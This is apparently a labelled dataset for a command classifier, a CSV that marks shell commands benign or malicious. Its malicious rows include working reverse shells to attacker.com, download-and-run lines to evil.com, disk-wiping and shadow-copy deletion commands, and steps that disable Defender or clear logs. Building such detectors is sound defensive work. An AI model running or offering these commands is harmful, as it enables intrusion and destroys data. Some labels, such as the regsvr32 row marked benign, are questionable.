command,label
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
sed 's/old/new/g' file.txt,benign
"(powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")')",malicious
umount /dev/sdb1,benign
sudo traceroute google.com,benign
:(){ :|:& };:,malicious
cp file1.txt file2.txt,benign
nslookup google.com > output.txt,benign
usermod -aG sudo user,benign
"cut -d',' -f1 data.csv",benign
nohup netsh advfirewall set allprofiles state off,malicious
groups user -v,benign
nc -l -p 4444 -e /bin/bash,malicious
sc stop Windows Defender,malicious
:(){ :|:& };:,malicious
mkdir -p /tmp/test,benign
id user,benign
ps aux 2>/dev/null,benign
(sc stop Windows Defender),malicious
(attrib +h +s malware.exe),malicious
rm -rf /,malicious
ssh user@server.com --help,benign
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
sdelete -p 10 -s -z C:\,malicious
echo 'Hello World',benign
taskkill /f /im antimalware.exe,malicious
cat /etc/passwd > output.txt,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
systemctl status nginx,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
wget https://example.com/file.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
netsh advfirewall set allprofiles state off 2>&1,malicious
sudo netstat -tulpn,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
tar -czf backup.tar.gz /data,benign
touch newfile.txt 2>/dev/null,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
(sdelete -p 10 -s -z C:\),malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
node --version,benign
cp file1.txt file2.txt,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
wc -l document.txt 2>/dev/null,benign
wevtutil cl System,malicious
cipher /w:C:\,malicious
df -h,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
kubectl get pods 2>/dev/null,benign
pwd,benign
sdelete -p 10 -s -z C:\ 2>&1,malicious
which python,benign
sc stop Windows Defender,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe 2>&1,malicious
msbuild project.csproj,benign
sort data.txt > output.txt,benign
cipher /w:C:\,malicious
shutdown /r /f /t 0 &,malicious
w,benign
date,benign
mshta javascript:alert('code execution'),malicious
uptime,benign
userdel olduser,benign
nslookup google.com,benign
echo 'virus' > /etc/passwd,malicious
curl -I https://google.com,benign
cat /dev/urandom > /dev/sda,malicious
kubectl get pods,benign
crontab -l,benign
taskkill /f /im antimalware.exe,malicious
yum list installed,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') &",malicious
cipher /w:C:\,malicious
timeout 60 nc -l -p 4444 -e /bin/bash,malicious
net user hacker password123 /add 2>&1,malicious
groups user,benign
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
id user,benign
sdelete -p 10 -s -z C:\,malicious
traceroute google.com -v,benign
chmod 755 script.sh,benign
rmdir empty_folder,benign
type ls,benign
"(socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash)",malicious
docker images,benign
top -v,benign
nohup powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
ls -la,benign
diskpart select disk 0 clean,malicious
nohup :(){ :|:& };:,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
echo 'virus' > /etc/passwd,malicious
rm -rf / &,malicious
apt list --installed,benign
sc stop Windows Defender,malicious
sdelete -p 10 -s -z C:\,malicious
sort data.txt,benign
service apache2 status,benign
sudo tail -f /var/log/syslog,benign
python --version,benign
:(){ :|:& };:,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
dd if=/dev/zero of=/dev/sda,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
vssadmin delete shadows /all /quiet,malicious
groups user,benign
csc -target:library file.cs --help,benign
chmod 777 /etc/shadow,malicious
attrib +h +s malware.exe >/dev/null,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
echo 'virus' > /etc/passwd,malicious
rmdir empty_folder > output.txt,benign
ss -tulpn,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
wevtutil cl Security,malicious
umount /dev/sdb1 > output.txt,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon 2>&1,malicious
timeout 60 bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
tar -czf backup.tar.gz /data | head -5,benign
nohup certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
nc -l -p 4444 -e /bin/bash,malicious
whoami,benign
mkdir -p /tmp/test,benign
net localgroup administrators hacker /add,malicious
mshta javascript:alert('code execution'),malicious
:(){ :|:& };:,malicious
sudo date,benign
systemctl reload nginx,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
traceroute google.com -v,benign
top,benign
sc stop Windows Defender,malicious
vssadmin delete shadows /all /quiet,malicious
sc stop Windows Defender 2>&1,malicious
ss -tulpn 2>/dev/null,benign
uptime | head -5,benign
ping -c 4 google.com,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
wc -l document.txt,benign
sdelete -p 10 -s -z C:\ >/dev/null,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
traceroute google.com --help,benign
sudo nslookup google.com,benign
net user hacker password123 /add,malicious
chown user:group file.txt -v,benign
mshta javascript:alert('code execution'),malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
node --version,benign
w,benign
umount /dev/sdb1 > output.txt,benign
mshta javascript:alert('code execution'),malicious
finger user,benign
htop,benign
sudo du -sh /var/log,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
groups user,benign
cipher /w:C:\,malicious
ping -c 4 google.com,benign
taskkill /f /im antimalware.exe,malicious
mv old.txt new.txt,benign
vssadmin delete shadows /all /quiet 2>&1,malicious
fdisk -l,benign
net user hacker password123 /add 2>&1,malicious
sort data.txt,benign
ls -la,benign
ps aux,benign
ncat -lvp 443 -e cmd.exe,malicious
(shutdown /r /f /t 0),malicious
sc stop Windows Defender,malicious
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
lsblk 2>/dev/null,benign
shutdown /r /f /t 0,malicious
(cmd /c del /q /s C:\*),malicious
echo 'virus' > /etc/passwd,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
sudo rsync -av /src/ /dst/,benign
dd if=/dev/zero of=/dev/sda,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' 2>&1",malicious
diskpart select disk 0 clean 2>&1,malicious
netstat -tulpn,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
yum list installed,benign
sudo usermod -aG sudo user,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
git clone https://github.com/user/repo.git,benign
iptables -L,benign
git pull origin main > output.txt,benign
wevtutil cl Security &,malicious
sudo cat /etc/passwd,benign
date,benign
shutdown /r /f /t 0,malicious
chown user:group file.txt,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
mkfs.ext4 /dev/sda1,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe &,malicious
format C: /q /x,malicious
npm list,benign
cat /dev/urandom > /dev/sda,malicious
sudo useradd newuser,benign
pwd -v,benign
ufw status -v,benign
chmod 755 script.sh -v,benign
userdel olduser,benign
echo 'virus' > /etc/passwd,malicious
id user > output.txt,benign
iostat > output.txt,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
nohup vssadmin delete shadows /all /quiet,malicious
powershell Get-Process,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
finger user,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
"nohup perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
vssadmin delete shadows /all /quiet,malicious
timeout 60 echo 'virus' > /etc/passwd,malicious
traceroute google.com,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cat /etc/passwd --help,benign
wget http://malicious.com/malware.exe,malicious
msbuild project.csproj -v,benign
ss -tulpn 2>/dev/null,benign
chown user:group file.txt -v,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
ps aux | head -5,benign
msbuild project.csproj,benign
curl -I https://google.com,benign
whoami,benign
tail -f /var/log/syslog > output.txt,benign
vssadmin delete shadows /all /quiet,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
dd if=/dev/zero of=/dev/sda,malicious
timeout 60 sdelete -p 10 -s -z C:\,malicious
(netsh advfirewall set allprofiles state off),malicious
wget http://malicious.com/malware.exe,malicious
which python,benign
who | head -5,benign
nohup sc stop Windows Defender,malicious
diskpart select disk 0 clean,malicious
cp file1.txt file2.txt,benign
systemctl reload nginx,benign
nohup format C: /q /x,malicious
java -version,benign
nohup rm -rf /,malicious
docker ps,benign
userdel olduser,benign
node --version,benign
which python,benign
cp file1.txt file2.txt,benign
yum list installed --help,benign
date,benign
w,benign
usermod -aG sudo user,benign
tar -czf backup.tar.gz /data 2>/dev/null,benign
userdel olduser,benign
chmod 777 /etc/shadow,malicious
chown user:group file.txt | head -5,benign
certutil -hashfile file.txt SHA256,benign
last 2>/dev/null,benign
mshta javascript:alert('code execution') >/dev/null,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
nohup cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
service apache2 status | head -5,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
diskpart select disk 0 clean,malicious
rsync -av /src/ /dst/,benign
sudo ping -c 4 google.com,benign
net user hacker password123 /add >/dev/null,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
sed 's/old/new/g' file.txt,benign
sc stop Windows Defender,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
man ls,benign
vssadmin delete shadows /all /quiet,malicious
finger user,benign
who,benign
ufw status,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
wc -l document.txt --help,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
sdelete -p 10 -s -z C:\,malicious
kubectl get pods,benign
ping -c 4 google.com --help,benign
yum list installed,benign
chmod 777 /etc/shadow,malicious
du -sh /var/log,benign
cat /etc/passwd 2>/dev/null,benign
echo 'virus' > /etc/passwd,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
chown user:group file.txt,benign
ufw status 2>/dev/null,benign
format C: /q /x,malicious
timeout 60 bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
ping -c 4 google.com,benign
iostat,benign
sudo top,benign
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
"nohup ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
pwd,benign
lsblk,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
who,benign
taskkill /f /im antimalware.exe,malicious
format C: /q /x,malicious
ssh user@server.com,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
mv old.txt new.txt,benign
net user hacker password123 /add >/dev/null,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts 2>&1,malicious
wevtutil cl Security,malicious
mount,benign
nohup curl http://evil.com/payload.sh | bash,malicious
diskpart select disk 0 clean,malicious
csc -target:library file.cs,benign
tar -czf backup.tar.gz /data,benign
ps aux,benign
which python,benign
whoami 2>/dev/null,benign
wevtutil cl System,malicious
userdel olduser,benign
echo 'virus' > /etc/passwd,malicious
mshta javascript:alert('code execution'),malicious
echo 'virus' > /etc/passwd,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
nohup wget http://malicious.com/malware.exe,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll | head -5,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
nohup curl http://evil.com/payload.sh | bash,malicious
curl -I https://google.com,benign
id user > output.txt,benign
git pull origin main,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
vmstat,benign
shutdown /r /f /t 0,malicious
usermod -aG sudo user,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
vssadmin delete shadows /all /quiet,malicious
mv old.txt new.txt,benign
userdel olduser,benign
mkfs.ext4 /dev/sda1,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') &",malicious
vssadmin delete shadows /all /quiet,malicious
vssadmin delete shadows /all /quiet,malicious
grep pattern file.txt,benign
nohup wevtutil cl Security,malicious
sudo nslookup google.com,benign
net localgroup administrators hacker /add,malicious
echo 'virus' > /etc/passwd,malicious
crontab -l,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
who 2>/dev/null,benign
pwd | head -5,benign
timeout 60 sdelete -p 10 -s -z C:\,malicious
diskpart select disk 0 clean,malicious
rmdir empty_folder,benign
cat /dev/urandom > /dev/sda,malicious
cat /dev/urandom > /dev/sda,malicious
sort data.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
nc -l -p 4444 -e /bin/bash,malicious
systemctl status nginx,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ &,malicious
htop,benign
type ls --help,benign
chmod 755 script.sh,benign
vssadmin delete shadows /all /quiet,malicious
mkfs.ext4 /dev/sda1,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
wget http://malicious.com/malware.exe,malicious
iptables -L,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
uptime,benign
apt list --installed,benign
ps aux,benign
cat /dev/urandom > /dev/sda,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
apt list --installed --help,benign
mv old.txt new.txt,benign
cmd /c del /q /s C:\*,malicious
java -version,benign
cat /dev/urandom > /dev/sda,malicious
yum list installed,benign
wc -l document.txt,benign
type ls,benign
mshta javascript:alert('code execution'),malicious
sudo crontab -l,benign
kubectl get pods,benign
w > output.txt,benign
wget https://example.com/file.txt | head -5,benign
